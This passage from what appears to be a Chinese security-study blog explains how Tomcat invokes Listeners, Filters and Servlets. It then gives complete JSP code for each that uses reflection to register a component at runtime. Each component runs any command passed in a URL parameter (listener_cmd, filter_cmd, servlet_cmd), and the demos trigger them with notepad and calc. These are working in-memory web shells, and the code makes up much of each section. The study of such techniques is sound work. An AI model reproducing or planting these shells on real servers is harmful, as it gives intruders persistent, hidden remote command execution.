+在requestInitialized()方法边上打个断点
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690525591086-8a2864ae-0384-41e8-a905-5e973864a2bd.png)
+
+开启调试，调用链如下：
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690525643022-0e011996-6de3-4d2c-9930-81c3dd81790c.png)
+
+这里进入了StandardContext.fireRequestInitEvent()方法，可以看到，第3724行有Listener调用了requestInitialized()方法
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690525893600-30cd894e-3bc6-494b-bc4f-f9a313add6a5.png)
+
+很显然，这个Listener来自StandardContext.getApplicationEventListeners()方法，我们跟进
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690526024454-fc443fb1-ece2-4e53-b4ac-36d0b7fd1f8c.png)
+
+其实Listener就是来自StandardContext.applicationEventListenersList这个成员变量，我们跟进
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690530131521-7f71815b-e168-46ba-b60f-12f7bb877ef5.png)
+
+StandardContext.applicationEventListenersList这个成员变量就是个列表，里面装着的正是我们的MyListener，且我们MyListener对象里面没有其他的成员变量
+
+至此，就清楚了Listener是咋被调用的了
+
+1.  从StandardContext.applicationEventListenersList找到Listener
+2.  调用StandardContext.fireRequestInitEvent()，触发MyListener.requestInitialized()方法
+
+## 2.4、动态注册Listener实现内存马
+
+我们要动态注册Listener的话，只有向StandardContext.applicationEventListenersList里面添加Listener，这样才能被调用到
+
+现在我们在StandardContext类中搜索“this.applicationEventListenersList”，看看有啥方法可以向里面添加Listener的
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690526777231-73017c56-6ffb-4d2d-b8be-0dae0c70ace8.png)
+
+第635行的addApplicationEventListener()方法符合这个条件，那么可以直接写代码了，代码逻辑如下
+
+1.  写一个Listener，然后new一个对象
+2.  获取到一个StandardContext对象
+3.  调用StandardContext.addApplicationEventListener()方法，添加我们的Listener对象
+
+完整jsp代码如下：
+
+```java
+<%@ page import="java.io.IOException" %>
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="org.apache.catalina.connector.RequestFacade" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%@page language="java" contentType="text/html; charset=UTF-8" %>
+
+<%-- 写一个Listener，然后new一个对象 --%>
+<%
+    class MyListener implements ServletRequestListener {
+        @Override
+        public void requestInitialized(ServletRequestEvent sre) {
+            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
+            String commad = request.getParameter("listener_cmd");
+            if(commad != null) {
+                try {
+                    Runtime.getRuntime().exec(commad);
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                }
+            }
+        }
+
+        @Override
+        public void requestDestroyed(ServletRequestEvent sre) {
+        }
+    }
+
+    MyListener myListener = new MyListener();
+%>
+
+<%-- 获取到一个StandardContext对象 --%>
+<%
+    RequestFacade requestFacade = (RequestFacade) request;
+    Class requestFacadeClass = requestFacade.getClass();
+    Field getRequestField = requestFacadeClass.getDeclaredField("request");
+    getRequestField.setAccessible(true);
+    Request getRequest = (Request) getRequestField.get(requestFacade);
+    StandardContext standardContext = (StandardContext) getRequest.getContext();
+%>
+
+<%-- 调用StandardContext.addApplicationEventListener()方法，添加我们的Listener对象 --%>
+<%
+    standardContext.addApplicationEventListener(myListener);
+%>
+
+```
+
+## 2.5、验证
+
+在web.xml中没有添加Listener的情况下，输入路由?listener\_cmd=notepad
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690528049078-8b855206-07e0-4ab8-9df9-42c1692420e9.png)
+
+没有弹出记事本，毫无反应
+
+访问实现动态注册的jsp
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690528424336-f77edba0-44c1-4be3-a3b2-e59838b26b2e.png)
+
+再次输入路由?listener\_cmd=notepad
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690528466905-a90f4ec2-c758-480e-8688-d691425a466b.png)
+
+成功弹出记事本
+
+# 3、Filter内存马
+
+## 3.1、简述
+
+Filter是一种Servlet的扩展机制，在web.xml中配置，在Context容器中进行管理，主要用于对请求和响应进行预处理和后处理的组件
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690528722931-b136bec6-2b23-4c4c-9b08-51edcdecdaff.png)
+
+主要是存储在StandardContext.filterDefs这个成员变量中的
+
+## 3.2、编写一个Filter
+
+首先写一个Filter，然后在web.xml中配置
+
+```java
+package com.tomcatd0.filter;
+
+import javax.servlet.*;
+import java.io.*;
+
+public class MyFilter implements Filter {
+    @Override
+    public void init(FilterConfig filterConfig) {
+    }
+
+    @Override
+    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+        String commmand = servletRequest.getParameter("filter_cmd");
+        if(commmand != null) {
+            try {
+                Runtime.getRuntime().exec(commmand);
+            } catch (IOException e) {
+                throw new RuntimeException(e);
+            }
+        }
+    }
+
+    @Override
+    public void destroy() {
+    }
+}
+
+```
+
+```java
+<?xml version="1.0" encoding="UTF-8"?>
+<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
+         version="4.0">
+    
+    <filter>
+        <filter-name>MyFilter</filter-name>
+        <filter-class>com.tomcatd0.filter.MyFilter</filter-class>
+    </filter>
+    <filter-mapping>
+        <filter-name>MyFilter</filter-name>
+        <url-pattern>/myfilter</url-pattern>
+    </filter-mapping>
+    
+</web-app>
+```
+
+可以看到，Filter在web.xml的配置和Listener不一样，多了个路由
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690529433059-db1a3522-ac4e-40dc-9728-a2d3f5f913da.png)
+
+成功弹出计算器
+
+## 3.3、调用链分析
+
+在doFilter()方法边上打个断点
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690529540511-71f29206-8c8b-4366-9c77-082df1b0bcbc.png)
+
+开启调试，调用链如下：
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690529621778-d8307758-f7dc-430d-9612-b0611fd89d75.png)
+
+这里进入了ApplicationFilterChain.internalDoFilter()方法，可以看到，第92行有Filter调用了doFilter()方法
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690529723159-3b48102c-0ffa-4102-8c77-05d606d33654.png)
+
+这个Listener来自ApplicationFilterChain.filters这个成员变量，我们跟进ApplicationFilterChain.filters
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690529864783-30bba8a8-daad-4b4c-a081-3dd426e3724f.png)
+
+ApplicationFilterChain.filters是一个元素为ApplicationFilterConfig对象的数组，可以看到数组中含有我们写的MyFilter
+
+这里我们搜索关键字“this.filters”，看看哪里可以是否有添加元素的方法
+
+145行的ApplicationFilterChain.addFilter()方法可以向filters添加元素
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690530914717-c0850b3d-4510-4944-b984-0713995088d5.png)
+
+这个方法先对现在的filters进行遍历，将传入的ApplicationFilterConfig对象与filters中的ApplicationFilterConfig对象进行对比，如果想等，则直接跳出循环（149-152行）；如果不想等，则先判断此时的n的长度和filers的长度是否相同，如果相同，则将filters的长度扩大10，最后将传入的ApplicationFilterConfig对象添加到filtrs中，同时n增长1
+
+其实就是判断添加进的ApplicationFilterConfig对象是否重复，并且在添加时候判断filters满了没，满了就扩大10个位置，免得ApplicationFilterConfig对象装不进去
+
+但是值得注意的是，这里的ApplicationFilterChain.filters最开始里面并没有元素（new ApplicationFilterConfig\[0];），也就是说并没有Filter对象，而这里却包含了我们的MyFilter，说明给filters添加元素的方法在后面的调用链中
+
+所以在后面的调用链中直接关注“ApplicationFilterChain”和“addFilter”
+
+在进入StandardWrapperValve.invoke()方法时候，创建了一个ApplicationFilterChain对象filterChain，是通过ApplicationFilterFactory.createFilterChain()方法获取到的
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690533235327-c647a5da-b8a2-42d7-89ea-89cb68845bb7.png)
+
+跟进ApplicationFilterFactory.createFilterChain()方法，发现第64行调用了ApplicationFilterChain.addFilter()方法
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690533450572-534a5f00-c0f7-4534-b624-865d7187e6ae.png)
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690533832224-5f978e3f-a240-4b79-8ba4-6a313727f1a1.png)
+
+这里稍微分析一下
+
+1.  从Wrapper对象中获取到StandardContext对象
+2.  从StandardContext对象获取到FilterMaps对象
+3.  遍历FilterMaps对象获取FilterMap对象
+4.  判断请求中的路由和FilterMap对象中设置的路由是否想等，同时判断请求中的调度器与FilterMap对象中设置的调度器（dispatcherMapping）是否相同
+5.  如果相同，就将FilterMap对象的FilterName传入到StandardContext.getFilterConfig()方法中获取到FilterConfig对象，接着再强转为ApplicationFilterConfig对象
+6.  最后将ApplicationFilterConfig对象通过ApplicationFilterChain.addFilter()方法加入到filters中
+
+从流程可以看出，FilterMap是一个存储Filter映射规则的对象
+
+这里6个流程中，第5个流程有点复杂
+
+我们先跟进到StandardContext.getFilterConfig()方法
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690535379079-4b19015c-db0d-4184-905c-fe8a0bd19ab2.png)
+
+这么看来，FilterConfig对象其实就是从StandardContext.filterConfigs这个成员变量中获取
+
+跟进StandardContext.filterConfigs
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690535467529-42bad22a-7018-4beb-9e33-1960c78ac444.png)
+
+StandardContext.filterConfigs是一个HashMap对象，用键、值的方式存储，所以StandardContext.getFilterConfig()方法就是通过键（filterName）获取到ApplicationFilterConfig对象
+
+String类型的filterName好解决，但是ApplicationFilterConfig的创建就难了，我们跟进到ApplicationFilterConfig的构造函数
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690535750202-27288649-e0f3-4f68-b5f0-b6394c070b48.png)
+
+构造函数没有用public修饰，所以只能反射获取ApplicationFilterConfig对象，而且ApplicationFilterConfig需要用到FilterDef对象
+
+我们直接在ApplicationFilterConfig的构造函数那里打个断点，然后调试，看看初始化的时候FilterDef对象中有啥
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690656844087-aff02258-fa44-43e2-9383-7ee6c885f3f9.png)
+
+可以看到，此时的FilterDef对象中，设置了filter、filterClass、filterName、asyncSupported四个属性
+
+filter就是Filter对象
+
+filterClass就是Filter对象的class
+
+filterName就是Filter对象的名称
+
+asyncSupported不知道是啥，照葫芦画瓢也设置成"true"
+
+## 3.4、动态注册Filter实现内存马
+
+综上所述，想要将我们的Filter加入到StandardContext.filters中，代码逻辑如下：
+
+1.  写一个Filter
+
+2.  获取到一个StandardContext对象
+
+3.  创建一个FilterDef对象
+
+4.  设置FilterDef.filterName
+
+5.  设置FilterDef.filterClass
+
+6.  设置FilterDef.filter
+
+7.  设置FilterDef.asyncSupported
+
+8.  将FilterDef对象加入到StandardContext.filterDefs中
+
+9.  创建一个FilteMap对象
+
+10. 设置FilteMap.FilterName
+
+11. 设置FilteMap.urlPatterns
+
+12. 设置FilteMap.dispatcherMapping
+
+13. 将FilteMap对象加入到StandardContext.FilterMaps中
+
+14. 通过StandardContext和FilterDef两个对象，反射创建一个ApplicationFilterConfig对象
+
+15. ApplicationFilterConfig对象(filter对象)通过HashMap.put()方法加入进StandardContext.filterConfigs中
+
+完整jsp代码如下：
+
+```java
+<%@ page import="org.apache.catalina.connector.RequestFacade" %>
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="java.util.HashMap" %>
+<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
+<%@ page import="java.io.PrintWriter" %>
+<%@ page import="java.io.IOException" %>
+<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
+<%@ page import="java.lang.reflect.Constructor" %>
+<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
+<%@ page import="org.apache.catalina.Context" %>
+<%@page language="java" contentType="text/html; charset=UTF-8" %>
+
+<%-- Filter --%>
+<%
+    class MyFilter implements Filter {
+        @Override
+        public void init(FilterConfig filterConfig) throws ServletException {
+        }
+
+        @Override
+        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+            String commmand = servletRequest.getParameter("filter_cmd");
+            if(commmand != null) {
+                try {
+                    Runtime.getRuntime().exec(commmand);
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                }
+            }
+        }
+
+        @Override
+        public void destroy() {
+        }
+    }
+
+    MyFilter myFilter = new MyFilter();
+    String filterName = "lan";
+%>
+
+<%-- 获取到StandardContext对象 --%>
+<%
+    RequestFacade requestFacade = (RequestFacade) request;
+    Class requestFacadeClass = requestFacade.getClass();
+    Field getRequestField = requestFacadeClass.getDeclaredField("request");
+    getRequestField.setAccessible(true);
+    Request getRequest = (Request) getRequestField.get(requestFacade);
+    StandardContext standardContext = (StandardContext) getRequest.getContext();
+%>
+
+<%-- 创建一个FilterDef对象 --%>
+<%
+    FilterDef filterDef = new FilterDef();
+    filterDef.setFilterName(filterName);
+    filterDef.setFilterClass(myFilter.getClass().getName());
+    filterDef.setFilter(myFilter);
+    filterDef.setAsyncSupported("true");
+%>
+
+<%-- 将FilterDef对象加入到StandardContext.filterDefs中 --%>
+<%
+    standardContext.addFilterDef(filterDef);
+%>
+
+<%-- 创建一个FilteMap对象 --%>
+<%
+    FilterMap filterMap = new FilterMap();
+    filterMap.addURLPattern("/myfilter");
+    filterMap.setFilterName(filterName);
+    filterMap.setDispatcher(DispatcherType.REQUEST.name());
+%>
+
+<%-- 将FilteMap对象加入到StandardContext.FilterMaps中 --%>
+<%
+    standardContext.addFilterMap(filterMap);
+%>
+
+<%-- 获取到ApplicationFilterConfig对象 --%>
+<%
+    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
+    constructor.setAccessible(true);
+    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
+%>
+
+<%-- 将filter添加到filterConfigs中 --%>
+<%
+    Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
+    filterConfigsField.setAccessible(true);
+    HashMap filterConfigs = (HashMap) filterConfigsField.get(standardContext);
+    filterConfigs.put(filterName,filterConfig);
+%>
+```
+
+顺便说一嘴，将FilteMap对象加入到StandardContext.FilterMaps中时候，可以用StandardContext.addFilterMapBefore()方法，这个方法的作用是将Filter对象添加到链条的第一位，也就是每次触发filter时候都是优先我们的链条
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690658137062-b1b6d484-51ea-4aa8-b372-edc261a38a7a.png)
+
+## 3.5、验证
+
+在web.xml中没有添加Filter的情况下，输入路由/myfilter?filter\_cmd=notepad
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690540039616-46d338ff-0736-467f-9475-953f10499d85.png)
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690537617438-f0c8f8af-8465-45ba-a24a-a547f70ef87d.png)
+
+没有弹出记事本，毫无反应
+
+访问实现动态注册的MyFilter.jsp
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690539624484-85e412ae-b9c3-4eaf-8fb8-36d2e8b18333.png)
+
+再次访问路由/myfilter?filter\_cmd=notepad
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690539669849-a962d653-ff7c-4bdc-a53d-31b312dea709.png)
+
+成功弹出记事本
+
+# 4、Servlet内存马
+
+## 4.1、简述
+
+Servlet主要用于处理请求并生成响应，因此其主要作用是在Web应用程序中实现服务器端的业务逻辑。
+
+而Servlet是封装在Wrapper中，每一个Servlet都对应了一个Wrapper，当请求从Context向特定的Wrapper发送时，其实就是向Servlet发送，所以，也可以将Wrapper看作是一个Servlet
+
+## 4.2、编写一个Servlet
+
+首先写一个Servlet，然后在web.xml中配置
+
+```java
+package com.tomcatd0.servlet;
+
+import javax.servlet.*;
+import java.io.IOException;
+
+public class MyServlet implements Servlet {
+
+    @Override
+    public void init(ServletConfig servletConfig) throws ServletException {
+
+    }
+
+    @Override
+    public ServletConfig getServletConfig() {
+        return null;
+    }
+
+    @Override
+    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
+        String commmand = servletRequest.getParameter("servlet_cmd");
+        if(commmand != null) {
+            try {
+                Runtime.getRuntime().exec(commmand);
+            } catch (IOException e) {
+                throw new RuntimeException(e);
+            }
+        }
+    }
+
+    @Override
+    public String getServletInfo() {
+        return null;
+    }
+
+    @Override
+    public void destroy() {
+
+    }
+}
+
+```
+
+```java
+<?xml version="1.0" encoding="UTF-8"?>
+<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
+         version="4.0">
+    
+    <servlet>
+        <servlet-name>MyServlet</servlet-name>
+        <servlet-class>com.tomcatd0.servlet.MyServlet</servlet-class>
+    </servlet>
+    <servlet-mapping>
+        <servlet-name>MyServlet</servlet-name>
+        <url-pattern>/myservlet</url-pattern>
+    </servlet-mapping>
+
+</web-app>
+    
+```
+
+访问路由：/myservlet?servlet\_cmd=calc
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690636347108-e10a3c65-4562-469a-8cdb-31b154c99e1e.png)
+
+成功弹出计算器
+
+## 4.3、调用链分析
+
+在service()方法边上打个断点
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690636444088-bad8cde0-d915-4160-87a9-4d6f645f1a7a.png)
+
+开启调试，调用链如下：
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690636478852-07d54dee-0284-40e5-96d9-cef08267bc0b.png)
+
+这里进入了ApplicationFilterChain.internalDoFilter()方法，可以看到，第118行有Servlet对象调用了service()方法，后面我们需要关注这个Servlet对象咋来的
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690637125916-2c2600ba-8d5b-4112-8af5-9bf1e43c4412.png)
+
+跟进一下this.service，可以看到，ApplicationFilterChain.service没有初始化（值为null），我们搜一下关键字“this.servlet”看看有哪个方法可以给他赋值的
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690637166036-07e74e1c-9123-4ea8-9a2a-302917d7da5a.png)
+
+180行的ApplicationFilterChain.setServlet()方法可以，那么后面我们就注意看看哪条链调用了ApplicationFilterChain.setServlet()方法，主要是注意关键字“ApplicationFilterChain”和“setServlet(”
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690637239947-e318a34c-c477-46e3-a6d2-4886b2866841.png)
+
+这里跟进到了StandardWrapperValve.invoke()方法，第97行实例化了个ApplicationFilterChain，跟进ApplicationFilterFactory.createFilterChain()方法
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690637370174-fcbf1142-cdb5-4aa8-814e-c5d4604d2806.png)
+
+在ApplicationFilterFactory.createFilterChain()方法中，第40行调用了ApplicationFilterChain.setServlet()方法，我们跟进一下它的参数servlet
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690637465994-eb5163d7-72b0-4967-854f-d1544fdb1a03.png)
+
+确认到是传参传入的servlet，我们又需要回到StandardWrapperValve.invoke()方法，因为是StandardWrapperValve.invoke()方法中调用了ApplicationFilterFactory.createFilterChain()方法的
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690637529505-58ab45af-b3cc-4237-bef5-b1481315b66a.png)我们跟进下StandardWrapperValve.invoke()方法中第98行传入的servlet，看看servlet咋来的
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690637604761-7c112915-d402-4216-8bf7-eb7215dc4093.png)
+
+这里的servlet也是没有初始化的，继续往下面看代码
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690637672340-a8736615-bfa8-4dd3-8dd3-f58f814e74a5.png)
+
+第65行有一个if条件，此时unavailable是false，!false=true，所以进入到了servlet = wrapper.allocate();，我们可以知道，servlet来自StandardWrapper.allocate()方法，我们跟进StandardWrapper.allocate()
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690637716202-91b14a8d-a1bc-4a04-a527-20d0056e2ea8.png)
+
+下面我们对StandardWrapper.allocate()方法进行分析
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690644979124-116a2ab7-13c9-4026-a7ce-d60f95010425.png)
+
+根据StandardWrapper的属性和StandardWrapper.allocate()方法的代码逻辑，最终会走到337行的代码，看上面的图，this.instance其实就一个Servlet对象
+
+不过有意思的来了，代码第331行有两条路可以走，如果this.instance还没有初始化（==null），那就会走到第337行进行初始化；如果已经初始化了（!=null），那就直接返回Servlet
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690651032571-61847d20-1fad-44dc-917b-5212d7911087.png)
+
+作为一个懒狗，多一事不如少一事，我们搜一下关键字“this.instance”看看有没有直接可以初始化的函数
+
+第247行StandardWrapper.setServlet()方法满足这个条件
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690651181470-2b978edc-965e-43a0-9bd4-a551ab9c2a26.png)
+
+ok，Servlet知道是咋可以搞的了，所以我们只需要将Wrapper装入StandardContext中，然后正常触发就完成了
+
+因为组件都是继承于ContainerBase这个抽象类，所以都会用父组件的addChild()方法将子组件添加到父组件中
+
+这里我们跟进到StandardContext.addChild()方法
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690654327872-bb3a9a70-a503-468d-a045-11f353f4e147.png)
+
+首先会通过Servlet名字判断这个Servlet是否为jsp（红框1），如果不是，就将child（StandardWrapper）添加到StandardContext中（红框2），然后再给这个child添加一个路由映射（红框3）
+
+## 4.4、动态注册Servlet实现内存马
+
+综上所述，想要将我们的Servlet动态注册，代码逻辑如下：
+
+1.  写一个Servlet
+2.  获取一个StandardContext
+3.  获取一个StandardWrapper对象
+4.  将StandardWrapper加入到StandardContext
+5.  设置StandardWrapper路由映射
+
+完整jsp代码如下：
+
+```java
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%@ page import="java.io.IOException" %>
+<%@ page import="org.apache.catalina.Wrapper" %>
+<%@ page import="org.apache.catalina.connector.RequestFacade" %>
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>
+
+<%
+    RequestFacade requestFacade = (RequestFacade) request;
+    Class requestFacadeClass = requestFacade.getClass();
+    Field getRequestField = requestFacadeClass.getDeclaredField("request");
+    getRequestField.setAccessible(true);
+    Request getRequest = (Request) getRequestField.get(requestFacade);
+    StandardContext standardContext = (StandardContext) getRequest.getContext();
+%>
+
+<%!
+
+    public class MyServlet implements Servlet {
+        @Override
+        public void init(ServletConfig config) throws ServletException {
+        }
+        @Override
+        public ServletConfig getServletConfig() {
+            return null;
+        }
+        @Override
+        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
+            String cmd = req.getParameter("servlet_cmd");
+            if (cmd !=null){
+                try{
+                    Runtime.getRuntime().exec(cmd);
+                }catch (IOException e){
+                    e.printStackTrace();
+                }catch (NullPointerException n){
+                    n.printStackTrace();
+                }
+            }
+        }
+        @Override
+        public String getServletInfo() {
+            return null;
+        }
+        @Override
+        public void destroy() {
+        }
+    }
+    MyServlet myServlet = new MyServlet();
+
+%>
+
+<%
+    String name = myServlet.getClass().getSimpleName();
+
+    Wrapper wrapper = standardContext.createWrapper();
+    wrapper.setName(name);
+    wrapper.setServlet(myServlet);
+%>
+
+<%
+    standardContext.addChild(wrapper);
+    standardContext.addServletMappingDecoded("/myservlet",name);
+%>
+```
+
+## 4.5、验证
+
+在web.xml中没有添加Servlet的情况下，输入路由/myservlet?servlet\_cmd=notepad
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690540039616-46d338ff-0736-467f-9475-953f10499d85.png)
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690655150645-a56c63eb-8473-425e-a514-d453d90fce9e.png)
+
+没有弹出记事本，毫无反应
+
+访问实现动态注册的MyServlet.jsp
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690655181061-d214446f-b063-4abb-9342-afd3d96143b1.png)
+
+再次访问路由/myservlet?servlet\_cmd=notepad
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690655203348-6b0ee869-8552-4dc3-8495-48f68aa3982e.png)
+
+成功弹出记事本
+
+# 5、总结
+
+Listener内存马：
+
+1.  将我们的Listener添加到applicationEventListenersList中即可
+
+Filter内存马：
+
+1.  设置FilterDef对象，其中包含了Filter的配置属性，然后添加到StandardContext.filterDefs
+2.  设置FilteMap对象，其中包含了Filter的映射路由StandardContext.filterMaps
+3.  设置ApplicationFilterConfig对象，并将其添加到StandardContext.filterConfigs
+
+Servlet内存马：
+
+1.  设置一个Wrapper对象，其中包含了Servlet的配置属性
+2.  将Wrapper添加到StandardContext对象中
+3.  在StandardContext中设置Wrapper的访问路由
+
+# 6、完结？
+
+好像还有一个value内存马，在houst中触发的？
+
+可喜可贺，内存马算是告落了一段落，里面的分析，再学了tomcat基础知识后，就真的好懂了很多
+
+接下来要的去学冰蝎马如何编写的，内存马+冰蝎
+]]></content>
+      <tags>
+        <tag>java安全</tag>
+      </tags>
+  </entry>
+</search>
